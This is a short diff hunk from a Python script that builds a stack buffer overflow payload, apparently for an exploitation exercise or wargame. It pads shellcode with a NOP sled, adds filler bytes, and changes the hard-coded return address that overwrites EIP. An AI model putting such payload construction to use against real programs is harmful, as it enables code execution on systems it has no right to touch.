@@ -14,7 +14,7 @@ s += b'/' + shellcode.rjust(128, b'\x90')
 s += b'AAAABBBBCCCCDDDDEEEEFFFFGGGG'
 
 # eip
-s += struct.pack("<I", 0xbffffaf2)
+s += struct.pack("<I", 0xbffffda2)
 
 # with open('data', 'wb') as f:
 #     f.write(s)
